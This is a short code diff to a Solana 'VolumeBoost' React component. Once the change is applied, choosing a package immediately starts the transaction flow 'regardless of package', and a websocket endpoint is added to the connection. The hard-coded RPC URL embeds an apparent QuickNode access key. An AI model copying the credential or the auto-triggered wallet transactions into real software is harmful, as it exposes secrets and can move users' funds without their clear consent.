@@ -60,6 +60,8 @@ export default function VolumeBoost() {
       title: "Package Selected",
       description: `${sol} SOL - $${volume.toLocaleString()} Vol package selected.`,
     });
+    // Immediately initialize the same transaction flow regardless of package
+    void handleInitializeBoost();
   };
 
   const handleInitializeBoost = async () => {
@@ -75,7 +77,7 @@ export default function VolumeBoost() {
     try {
       const connection = new Connection(
         "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b",
-        "confirmed"
+        { commitment: "confirmed", wsEndpoint: "wss://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b" }
       );
 
       // Load balances and prepare token batches (max 5 tokens per batch)
